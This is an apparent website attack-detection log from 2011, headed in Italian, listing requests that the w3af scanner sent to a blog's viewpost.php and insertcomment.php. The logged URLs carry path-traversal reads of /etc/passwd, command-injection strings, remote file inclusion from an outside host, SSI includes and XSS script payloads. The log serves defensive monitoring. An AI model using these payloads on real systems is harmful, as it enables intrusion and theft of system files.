File di log creato il 31 March del 2011 alle ore 5:36 pm

March 31, 2011, 5:36 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+and+ | Referer: 
April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00.html | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%2500.php | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00 | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%2500.php | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00.html | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00 | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%2500.php | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00.html | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00.html | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%2500.php | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00 | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd | Referer: 

April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21-- | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21-- | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21-- | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21-- | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21-- | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21-- | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21-- | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21-- | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%26%26/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%7C/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3B/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%26%26/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%7C/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3B/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%26%26/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%7C/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3B/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%26%26/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%7C/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3B/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%26%26/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3B/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%7C/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%26%26/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%7C/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3B/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3B/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%7C/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%26%26/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%26%26/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3B/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%7C/bin/cat+/etc/passwd | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 

April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CSCrIPT%3Efake_alert(%22O0Yf%22)%3C/SCrIPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIPT%3Ea=/O0Yf/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(O0Yf))%3C/SCriPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CSCrIPT%3Efake_alert(%220Imi%22)%3C/SCrIPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(0Imi))%3C/SCriPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIPT%3Ea=/0Imi/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CSCrIPT%3Efake_alert(%22FZyZ%22)%3C/SCrIPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIPT%3Ea=/FZyZ/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(FZyZ))%3C/SCriPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CSCrIPT%3Efake_alert(%22M2fi%22)%3C/SCrIPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(M2fi))%3C/SCriPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIPT%3Ea=/M2fi/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CSCrIPT%3Efake_alert(%22sEsa%22)%3C/SCrIPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIPT%3Ea=/sEsa/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(sEsa))%3C/SCriPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CSCrIPT%3Efake_alert(%22lqBS%22)%3C/SCrIPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(lqBS))%3C/SCriPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIPT%3Ea=/lqBS/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CSCrIPT%3Efake_alert(%22p6uy%22)%3C/SCrIPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(p6uy))%3C/SCriPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIPT%3Ea=/p6uy/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 

